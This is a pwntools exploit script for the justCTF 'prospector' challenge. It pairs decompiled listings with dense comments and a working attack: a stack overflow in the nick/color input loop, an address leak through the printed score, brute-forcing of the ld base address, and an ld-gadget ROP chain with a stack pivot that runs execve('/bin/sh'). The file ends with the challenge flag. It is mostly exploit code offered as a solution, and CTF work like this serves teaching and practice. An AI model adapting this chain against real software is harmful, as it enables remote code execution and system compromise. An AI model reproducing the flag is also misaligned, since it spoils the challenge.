from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./prospector_patched', '''
    break-rva 0x1183
    break-rva 0x11d4
    break-rva 0x11ab
    break-rva 0x1231
    break-rva 0x125a
    continue
''')

# p = remote('prospector.nc.jctf.pro', 1337)

'''
00001075    int64_t calculate_score(void* arg1, int64_t* arg2)

0000109e        arg2[2].d = ((arg2 u>> 0x10).d * 2) & 0x1ffffffe
000010a8        void* i = *arg2
000010a8        
000010cd        while (i != 0)
000010cf            char* i_1 = i
000010d7            i = &i_1[1]
000010d7            
000010e0            if (*i_1 == 0)
000010e0                break
000010e0            
000010c5            arg2[2].d += sx.d(*i)
000010c5        
000010e6        int32_t result = *(arg1 + 8)
000010e6        
000010ec        if (result != 1)
000010fc            return result
000010fc        
000010f5        return print_score(arg2)
'''

'''
000010fd    int64_t initialize_player(int64_t* arg1, int64_t* arg2)

00001111        int64_t nick
00001111        __builtin_memset(s: &nick, c: 0, n: 0x20)
00001140        void* color = bump_alloc(arg1, 0xe0)
0000115a        memset(color, 0, 0xe0)
0000115a        
00001169        while (true)
00001169            puts("Nick: ")
00001169            
0000118a            if (read(0, &nick, 0xdf) s> 0)
000011ab                calculate_score(arg1, arg2)
000011ba                puts("Color: ")
000011ba                
000011db                if (read(0, color, 0xdf) s> 0)
000011db                    break
000011db                
000011e7                puts("Invalid color, try again\n")
000011e7                
000011f6                if (arg1[1].d == 1)
000011ff                    print_score(arg2)
0000118a            else
00001196                puts("Invalid name, try again\n")
00001196        
00001212        trim_newline(&nick)
0000121e        trim_newline(color)
0000123a        *arg2 = strdup(arg1, &nick)
00001245        arg2[1] = color
0000125a        return puts("Battle begins!\n")
'''

'''
00001668    int64_t strdup(int64_t* arg1, char* arg2)

00001683        void* rax_1 = strlen(arg2)
0000169e        int64_t result = bump_alloc(arg1, rax_1 + 1)
0000169e        
000016d9        for (void* i = nullptr; i u< rax_1; i += 1)
000016ca            *(i + result) = *(i + arg2)
000016ca        
000016e6        *(rax_1 + result) = 0
000016ee        return result
'''

'''
000015cc    int64_t bump_alloc(int64_t* arg1, int64_t arg2)

000015f2        *arg1 = (*arg1 + 0xf) & 0xfffffffffffffff0
000015f9        int64_t result = *arg1
00001612        *arg1 += arg2
0000161a        return result
'''

# exploitation mainly takes place in initialize_player function at offset 0x10fd, which enters a while loop containing two read syscalls to read "Nick" and "Color" respectively, and breaks out only when both read syscalls succeed

# read 0xdf bytes at most to "Nick" buffer starting from rbp-0x30
# value of rbp+0x10 is stored in rbp-0x38, aka *(rbp-0x38)=rbp+0x10
# set dword in *(rbp-0x38)+8 to 1, aka dword *(rbp+0x18)=1 (explained later)
# set qword in rbp-8 to 0, aka qword *(rbp-8)=0 (explained later)
p.sendafter(b"Nick: ", p64(0)*9+p32(1))
# value of mmaped_base_address+0x20 is stored in rbp-0x40, aka *(rbp-0x40)=mmap_base_address+0x20
# if read syscall to "Nick" buffer succeeds, calculate_score function at offset 0x1075 is called, taking value in rbp-0x38, aka *(rbp-0x38)=rbp+0x10, as rdi and value in rbp-0x40, aka *(rbp-0x40)=mmap_base_address+0x20, as rsi
# within calculate_score function, "score" value is calculated by (((mmap_base_address+0x20)>>0x10)*2)&0x1ffffffe, which is printed out only if *(rbp-0x38)+8=1
# since dword in *(rbp-0x38)+8 is set to 1 previously, "score" value can be successfully leaked
p.recvuntil(b"score: ")
# by reversing how "score" value is calculated, only mmap_base_address except for last two significant bytes can be retrieved by ((score+0xe0000000)//2)<<0x10
mmap_base_addr_candidate = ((int(p.recvuntil(b"\n", drop=True))+0xe0000000)//2)<<0x10
log.info(f"mmap base address candidate: {hex(mmap_base_addr_candidate)}")
# ld_base_address except for last two significant bytes can also be retrieved, because it has a fixed offset from mmap_base_address
# it should be noted that instead of +3000 offset locally, +0x9000 offset remotely
ld_base_addr_candidate = mmap_base_addr_candidate+0x3000
log.info(f"ld base address candidate: {hex(ld_base_addr_candidate)}")

# real mmap_base_address and ld_base_address have to be brute-forced to get, because they are only known except for last second significant byte (last first significant byte is always \x00 for any base address)
# considering ld_base_address can be completely known by brute-forcing and glibc_base_address is completely unknown, ROP with gadgets in ld is only choice to pop a shell
while True:
    # as for ROP with gadgets in ld to pop a shell, it is a common sense that stack pivoting has to be performed, because there are no pure pop register gadgets in ld
    POP_RAX_RET = ld_base_addr_candidate+0x15abb
    POP_RDI_POP_RBP_RET = ld_base_addr_candidate+0x3399
    POP_RSI_POP_RBP_RET = ld_base_addr_candidate+0x5700
    POP_RDX_LEAVE_RET = ld_base_addr_candidate+0x217bb
    SYSCALL_RET = ld_base_addr_candidate+0x16e49
    # it should be noted that first two qwords in ROP chain are a 'padding' part, ensuring that whole ROP chain can be executed continuously and rest of ROP chain doesn't get affected (explained later)
    chain_candidate = [
        POP_RAX_RET, mmap_base_addr_candidate+0x1000,  # (useless) rax=mmap_base_addr_candidate+0x1000
        POP_RDI_POP_RBP_RET, mmap_base_addr_candidate+0x40, 0,  # rdi=mmap_base_addr_candidate+0x40=&'/bin/sh\x00', rbp=0
        POP_RSI_POP_RBP_RET, 0, mmap_base_addr_candidate+0x48-8,  # rsi=0, rbp=mmap_base_addr_candidate+0x40
        POP_RAX_RET, 0x3b,  # rax=0x3b
        POP_RDX_LEAVE_RET, 0  # rdx=0, rsp=mmap_base_addr_candidate+0x48=&SYSCALL_RET, (useless) rbp=*(mmap_base_addr_candidate+0x40)
    ]
    # read 0xdf bytes at most to "Color" buffer starting from value in rbp-8, which is 0 at first loop and false attempted mmap_base_address+0x40 during brute-forcing at following loops
    # when value in rbp-8 is invalid, including 0 and all false attempted mmap_base_address+0x40, this read syscall fails and returns -1, leaving input data this time in stdin buffer and continuing to next loop
    # in next loop, read syscall for "Nick" buffer starting from rbp-0x30 takes in this former input data left in stdin buffer, and along with ROP chain being written to rbp+8, value in rbp-8 is set to attempted mmap_base_addr_candidate+0x40
    p.sendafter(b"Color: ", p64(0)*5+p64(mmap_base_addr_candidate+0x40)+p64(0)+b''.join([p64(c) for c in chain_candidate]))
    # in next loop, read syscall for "Color" buffer starting from value in rbp-8 takes in input data directly from stdin
    # when value in rbp-8 is valid, which is true mmap_base_address+0x40, '/bin/sh\x00' is written to mmap_base_address+0x40 and SYSCALL_RET gadget is written to mmap_base_address+0x48 for being executed just after stack pivoting
    # when value in rbp-8 is invalid, which is false attempted mmap_base_address+0x40, this read syscall fails and returns -1, leaving input data this time in stdin buffer and continuing to next loop of next loop
    # in next loop of next loop, read syscall for "Nick" buffer starting from rbp-0x30 takes in this former input data left in stdin buffer, and value in rbp-8 still remains no change as last loop's false attempted mmap_base_address+0x40
    p.sendafter(b"Color: ", b'/bin/sh\x00'+p64(SYSCALL_RET))
    # determine whether current attempt mmap_base_address+0x40 is true or false by checking if read syscall to read "Color" in next loop fails
    if p.recvline() == b"Invalid color, try again\n":
        # if it fails, current attempt mmap_base_address+0x40 is false, so increase mmap_base_addr_candidate by 0x1000 and ld_base_addr_candidate by 0x1000 as well to try next attempt in next loop of next loop
        mmap_base_addr_candidate += 0x1000
        ld_base_addr_candidate += 0x1000
    else:
        # if it succeeds, current attempt mmap_base_address+0x40 is true, so break out of while loop
        break

# right now, mmap_base_address and ld_base_address are completely known, ROP chain has been written to rbp+8, '/bin/sh\x00' has been written to mmap_base_address+0x40 and SYSCALL_RET gadget has been written to mmap_base_address+0x48
# once while loop is broken, strdup function at offset 0x1668 is called, taking value in rbp-0x38, aka *(rbp-0x38)=rbp+0x10, as rdi and rbp-0x30 as rsi
# within strdup function, bump_alloc function at offset 0x15cc is called to set **(rbp-0x38)+=strlen(rbp-0x30)+1, aka *(rbp+0x10)+=1, which means that value in rbp+0x10 is increased by 1
# this increased value at rbp+0x10 happens to be second qword in ROP chain, which is mmap_base_addr_candidate+0x1001 after incremented by 1, that's why first two qwords in ROP chain are so designed
# in order to make ROP chain to be executed successfully to pop a shell, first two qwords in ROP chain have to be not a only 'padding' part, but also executable as well
# ensure that real ROP qwords for shell popping starting from rbp+0x18 can be executed continuously and are not affected by this increment

# as exploited above overall, while returning from initialize_player function, shell will be popped by executing ROP chain starting genuinely from rbp+0x18 to prepare registers values and then stack pivoting to mmap_base_address+0x48 to execute syscall instruction
p.interactive()

# justCTF{sh1n3s_1n_rw_m3m}